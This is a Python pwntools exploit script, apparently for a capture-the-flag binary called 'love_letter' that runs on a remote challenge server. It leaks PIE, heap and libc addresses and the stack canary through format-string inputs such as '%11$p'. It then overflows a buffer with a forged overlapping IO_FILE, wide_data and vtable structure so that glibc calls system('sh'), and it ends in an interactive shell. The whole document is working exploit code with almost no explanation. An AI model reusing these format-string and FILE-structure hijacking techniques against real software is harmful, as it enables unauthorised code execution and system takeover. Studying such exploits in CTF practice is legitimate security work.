#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './love_letter'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '94.237.61.242', 46895

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# fmstr
# breakrva 0x1899

# potential bof
breakrva 0x1c81
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec love_letter 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'./glibc/'

def create(nickname, note, protect=False, password=""):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b'>', nickname)
    io.sendlineafter(b'>', note)
    io.sendlineafter(b'>', b'y' if protect else b'n')
    if protect:
        io.sendlineafter(b'>', password)

def edit(idx, nickname, note, protect=False, password=""):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b'>', str(idx).encode())
    if protect:
        io.sendlineafter(b'>', password)
    io.sendlineafter(b':', nickname)
    io.sendlineafter(b':', note)

def view(idx, protect=False, password=""):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b'>', str(idx).encode())
    if protect:
        io.sendlineafter(b'>', password)

def delete(idx, protect=False, password=""):
    io.sendlineafter(b':', b'4')
    io.sendlineafter(b'>', str(idx).encode())
    if protect:
        io.sendlineafter(b'>', password)

def exploit():
    global io
    io = initialize()

    create(b'%11$p', b'BBBB')
    view(1)
    io.recvuntil(b'Author: ')
    elf.address = int(io.recvline().strip(), 16) - 0x1e92

    edit(1, b'%7$p', b'BBBB')
    view(1)
    io.recvuntil(b'Author: ')
    heap = int(io.recvline().strip(), 16) - 0x2a0

    edit(1, b'%15$p', b'BBBB')
    view(1)
    io.recvuntil(b'Author: ')
    libc.address = int(io.recvline().strip(), 16) - 0x29d90

    edit(1, b'%9$p', b'BBBB')
    view(1)
    io.recvuntil(b'Author: ')
    canary = int(io.recvline().strip(), 16)

    edit(1, p64(heap + 0x19b0), b'BBBB')

    fp = heap + 0x19b0

    # copied payload from imaginaryCTF 2024 - onewrite
    # crafting overlapping IO_FILE, wide_data and wide_vtable
    overlap = b'  sh\x00\x00\x00\x00' # [FILE] _flags | [WIDE DATA] read_ptr
    overlap += flat([
        p64(0x0),               # [WIDE DATA] read_end
        p64(0x0),               # [WIDE DATA] read_base
        p64(0x0),               # [WIDE DATA] write_base
        p64(0x0),               # [WIDE DATA] write_ptr
        p64(0x0),               # [WIDE DATA] write_end
        p64(0x0),               # [WIDE DATA] buf_base
        p64(0x0),               # [WIDE DATA] buf_end 
        p64(0x0),               # [WIDE DATA] save_base
        p64(0x0),               # [WIDE DATA] backup_base 
        p64(0x0),               # [WIDE DATA] save_end
    ])
    overlap += b'\x00' * 8       # [WIDE DATA] state
    overlap += b'\x00' * 8       # [WIDE DATA] last_state

    codecvt = b''
    codecvt += p64(libc.sym['system'])          # [FILE] _chain | [WIDE DATA] codecvt | [VTABLE] __doallocate (at function authenticate, skips the puts because we overwrote stdout)
    codecvt += b'\x00' * 0x18                   # padding
    codecvt += p64(fp - 0x10)                   # [FILE] _lock
    codecvt += p64(0x0) * 2                     # padding
    codecvt += p64(heap+0x2d0-0xe0)                      # [FILE] _wide_data
    codecvt += b'\x00' * (0x18 + 4 + 20)        # padding
    codecvt += p64(libc.sym['_IO_wfile_jumps']) # [FILE] vtable
    codecvt += b'\x00' * (0x70 - len(codecvt))  # padding
    
    overlap += codecvt
    overlap += p64(0x0)                         # [WIDE DATA] wchar_t shortbuf[1] (alligned to 8 bytes)
    overlap += p64(fp)                          # [WIDE DATA] vtable

    payload = cyclic(0x100)
    payload += p64(0x0) + p64(0x00000000000001e1)
    payload += overlap
    payload += p64(0x0000000000000411)
    payload += p64(heap + 0x19b0)

    io.sendlineafter(b':', b'5')
    io.sendafter(b'>', payload)

    log.info("elf base: %#x", elf.address)
    log.info("heap base: %#x", heap)
    log.info("libc base: %#x", libc.address)
    log.info("canary: %#x", canary)
    log.info("fp: %#x", fp)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
